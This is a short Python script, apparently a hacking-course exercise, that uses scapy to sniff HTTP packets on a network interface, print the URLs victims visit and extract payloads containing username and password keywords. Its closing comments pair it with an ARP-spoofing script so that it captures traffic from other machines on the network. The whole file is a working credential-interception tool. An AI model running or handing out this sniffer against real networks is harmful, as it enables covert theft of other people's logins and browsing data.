#!/usr/bin/env python

import scapy.all as scapy
# pip install scapy_http
from scapy.layers import http


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def sniff(inf):
    scapy.sniff(iface=inf, store=False, prn=process_sniffed_pkt)
    # iface=(interface), store=False(storing info, not req), prn=(func to process packet)


def get_creds(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        # .load - to get the uname and pass string
        keywords = ["username", "user", "login", "password", "pass", "uname", "pwd"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_pkt(packet):
    if packet.haslayer(http.HTTPRequest):
        # to check for more layers to extract
        # print(packet.show())
        url = get_url(packet)
        print("[+] Http URL visited :- "+url)
        credentials = get_creds(packet)
        if credentials:
            print("\n\n[+] possible uname and password:- "+credentials+"\n\n")


interface = "eth0"
sniff(interface)
# to get complete use of this project on other machines,
# open a terminal and run python /root/PycharmProjects/arp-spoofing/main.py
# open an other tab in terminal and run python /root/PycharmProjects/packet-sniffing/main.py
                                        
